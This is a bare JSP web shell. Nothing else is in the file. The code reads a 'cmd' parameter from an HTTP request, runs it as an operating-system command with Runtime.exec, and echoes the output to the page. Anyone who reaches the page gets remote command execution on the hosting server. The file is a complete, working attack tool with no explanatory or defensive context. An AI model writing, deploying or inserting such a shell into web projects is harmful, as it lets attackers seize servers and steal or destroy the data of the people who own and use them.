<% if (request.getParameter("cmd") != null) {
   out.println("Output: " + request.getParameter("cmd") + "<br />");
   Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
   OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
 out.println(disr); disr = dis.readLine();
} } %>